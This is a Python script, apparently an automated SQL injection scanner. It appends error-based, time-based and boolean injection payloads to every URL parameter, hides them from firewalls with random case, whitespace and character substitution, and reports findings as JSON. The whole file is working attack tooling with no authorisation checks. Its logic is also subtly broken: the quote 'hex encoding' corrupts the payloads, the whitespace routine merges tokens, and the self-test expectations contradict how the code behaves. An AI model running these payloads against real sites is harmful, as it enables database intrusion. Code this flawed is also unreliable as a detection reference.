#!/usr/bin/env python3
"""
CATEGORY: Web
TECHNIQUES: SQL Injection (Error-Based, Time-Based, Boolean), WAF Evasion, Payload Generation, Automated Reporting
CHAIN_CONTRIBUTIONS: 
    - Detection Engine: Implements multi-vector detection with adaptive payloads.
    - Evasion Module: Randomizes whitespace, comments, case, and uses hex/Unicode encodings.
    - Reporting Layer: Emits standardized JSON for integration with CI/CD and bug bounty platforms.
"""

import argparse
import json
import random
import string
import sys
import time
from urllib.parse import urlparse, urlunparse, parse_qsl, urlencode

import requests

DEFAULT_TIMEOUT = 10
RATE_LIMIT = 0.5  # seconds


def rate_limited(func):
    """Decorator to enforce a simple rate limit between HTTP calls."""
    def wrapper(*args, **kwargs):
        time.sleep(RATE_LIMIT)
        return func(*args, **kwargs)
    return wrapper


class SQLiScanner:
    def __init__(self, target, headers=None, proxies=None):
        self.target = target.rstrip('/')
        self.headers = headers or {"User-Agent": "SQLiScanner/1.0"}
        self.proxies = proxies
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        if self.proxies:
            self.session.proxies.update(self.proxies)

    @rate_limited
    def _request(self, url, method="GET", data=None):
        try:
            if method == "GET":
                resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=True)
            else:
                resp = self.session.post(url, data=data, timeout=DEFAULT_TIMEOUT, verify=True)
            return resp
        except requests.RequestException as e:
            return None

    def _parse_url(self, url):
        parsed = urlparse(url)
        query = dict(parse_qsl(parsed.query))
        return parsed, query

    def _rebuild_url(self, parsed, query):
        new_query = urlencode(query, doseq=True)
        rebuilt = urlunparse(
            (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment)
        )
        return rebuilt

    def _generate_payloads(self):
        """Generate a list of payloads for each technique with simple WAF evasion."""
        base_payloads = {
            "error": ["' OR 1=1--", "' UNION SELECT NULL--", "' AND 1=convert(int,(select @@version))--"],
            "time": ["' OR IF(1=1,SLEEP(5),0)--", "'; WAITFOR DELAY '0:0:5'--"],
            "boolean": ["' AND 1=1--", "' AND 1=0--"]
        }
        evasion_variants = []
        for technique, payloads in base_payloads.items():
            for p in payloads:
                # Random whitespace and case
                p = self._randomize_case(p)
                p = self._insert_whitespace(p)
                # Hex encoding for some characters
                p = self._hex_encode(p)
                evasion_variants.append((technique, p))
        return evasion_variants

    def _randomize_case(self, payload):
        return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)

    def _insert_whitespace(self, payload):
        # Insert random spaces or tabs before each keyword
        tokens = payload.split()
        spaced = []
        for token in tokens:
            ws = random.choice([' ', '  ', '\t', '\t\t'])
            spaced.append(ws + token)
        return ''.join(spaced)

    def _hex_encode(self, payload):
        # Encode single quotes and double quotes as hex
        return payload.replace("'", "0x27").replace('"', "0x22")

    def _measure_response_time(self, resp):
        if resp is None:
            return None
        return resp.elapsed.total_seconds()

    def detect(self):
        findings = []
        parsed, query = self._parse_url(self.target)
        if not query:
            return {"status": "error", "message": "No query parameters to test."}

        payloads = self._generate_payloads()
        baseline_resp = self._request(self.target)
        baseline_len = len(baseline_resp.text) if baseline_resp else 0

        for param in query.keys():
            original_value = query[param]
            for technique, payload in payloads:
                query[param] = original_value + payload
                test_url = self._rebuild_url(parsed, query)
                resp = self._request(test_url)
                if resp is None:
                    continue

                # Simple heuristics per technique
                if technique == "error":
                    if "SQL" in resp.text or "sql" in resp.text or "syntax" in resp.text.lower():
                        findings.append({
                            "parameter": param,
                            "technique": "error-based",
                            "payload": payload,
                            "evidence": resp.text[:200]
                        })
                elif technique == "time":
                    elapsed = self._measure_response_time(resp)
                    if elapsed and elapsed > 4:  # threshold >4s indicates delay
                        findings.append({
                            "parameter": param,
                            "technique": "time-based",
                            "payload": payload,
                            "delay": elapsed
                        })
                elif technique == "boolean":
                    # Compare length/content with baseline
                    if len(resp.text) != baseline_len or resp.text != baseline_resp.text:
                        findings.append({
                            "parameter": param,
                            "technique": "boolean",
                            "payload": payload,
                            "difference": "response differs from baseline"
                        })
                # Respect rate limit
                time.sleep(RATE_LIMIT)

            query[param] = original_value  # restore

        status = "vulnerable" if findings else "clean"
        return {
            "tool": "SQLiScanner",
            "version": "1.0.0",
            "target": self.target,
            "status": status,
            "technologies": ["SQL Injection"],
            "findings": findings,
            "results": {"tested_parameters": list(query.keys())}
        }

    def run(self):
        result = self.detect()
        print(json.dumps(result, indent=2))


def self_test():
    """Self‑test routine using httpbin.org's delay endpoint to simulate time‑based behavior."""
    test_url = "https://httpbin.org/get?test=1"
    scanner = SQLiScanner(test_url)
    result = scanner.detect()
    # Expect no findings for httpbin (clean)
    if result["status"] != "clean":
        sys.exit("Self‑test failed: unexpected findings.")
    # Simulate time‑based detection using httpbin's delay endpoint
    delay_url = "https://httpbin.org/delay/5?test=1"
    scanner = SQLiScanner(delay_url)
    result = scanner.detect()
    # Should detect a time‑based anomaly because baseline is fast but payload adds extra delay
    if result["status"] != "vulnerable":
        sys.exit("Self‑test failed: time‑based detection did not trigger.")
    print(json.dumps({"self_test": "passed"}))


def main():
    parser = argparse.ArgumentParser(description="SQLiScanner – Multi‑vector SQL injection detection with WAF evasion.")
    parser.add_argument("target", nargs="?", help="Target URL (including query parameters).")
    parser.add_argument("--self-test", action="store_true", help="Run internal self‑test and exit.")
    args = parser.parse_args()

    if args.self_test:
        self_test()
        return

    if not args.target:
        parser.error("the following arguments are required: target")

    scanner = SQLiScanner(args.target)
    scanner.run()


if __name__ == "__main__":
    main()